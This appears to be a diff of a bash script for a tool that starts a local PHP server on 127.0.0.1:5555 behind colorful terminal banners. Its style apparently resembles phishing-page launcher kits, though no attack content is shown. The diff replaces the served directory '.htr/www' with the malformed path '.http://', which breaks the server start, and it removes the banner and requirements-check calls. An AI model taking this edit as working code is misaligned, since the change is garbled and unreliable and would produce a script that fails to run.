@@ -117,9 +117,8 @@ start_localhost() {
 
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+cd .http:// && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
-smallbanner
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"
 
@@ -345,5 +344,4 @@ done
 }
 
 banner
-reqs
 menu
